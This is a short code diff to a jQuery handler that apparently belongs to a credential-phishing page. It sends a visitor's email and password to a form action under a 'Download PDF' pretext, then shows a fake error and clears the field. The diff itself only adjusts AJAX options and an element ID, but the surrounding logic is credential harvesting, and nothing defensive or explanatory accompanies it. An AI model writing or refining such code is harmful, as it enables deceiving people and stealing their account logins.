@@ -54,18 +54,19 @@
     
             $.ajax({
                 url: $('#gawaboy').attr('action'),
-                method: "post",
+                type: "post",
+                dataType: 'text',
                 data: {email: input4email, password: input4passwd},
                 processData: true,
                 complete: function(jqXHR) {
                setTimeout(function() {
                     $('#showerror').show();
-                    $("#akpati1").val(url);
+                    $("#akpati").val(url);
                     $("#igodo").val("");
                     $('#btn4sbmt').html('Download PDF').prop('disabled', false);
                 }, 2000);
             }   
-                }
+               
             });   
     
         });  	
